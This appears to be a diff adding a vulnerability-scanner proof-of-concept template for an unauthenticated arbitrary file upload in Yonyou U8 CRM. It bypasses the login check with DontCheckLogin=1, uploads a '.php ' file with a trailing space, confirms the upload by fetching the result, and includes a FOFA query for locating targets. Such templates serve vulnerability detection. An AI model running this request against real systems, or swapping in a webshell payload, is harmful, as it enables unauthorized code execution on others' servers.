@@ -1,0 +1,39 @@
+id: poc-yaml-yongyon-u8-crm-uploadfile-php-anyfile-upload
+info:
+  name: 用友U8CRM uploadfile.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: base64(random_str(4))
+requests:
+- method: POST
+  path: /ajax/uploadfile.php?DontCheckLogin=1&vname=file
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
+  data: '-----------------------------269520967239406871642430066855
+
+    Content-Disposition: form-data; name="file"; filename="%s.php "
+
+    Content-Type: application/octet-stream
+
+
+    {{.t1}}
+
+    -----------------------------269520967239406871642430066855
+
+    Content-Disposition: form-data; name="upload"
+
+
+    upload
+
+    -----------------------------269520967239406871642430066855--'
+  expression: status_code == 200 && contains(body,"\"success\":true")
+  output:
+  - regex_match(body,`tmpfile\\\/(?P<file>.*).tmp.php`)
+- method: GET
+  path: /tmpfile/{{.file}}.tmp.php
+  expression: status_code == 200 && body == t1
+transport: http
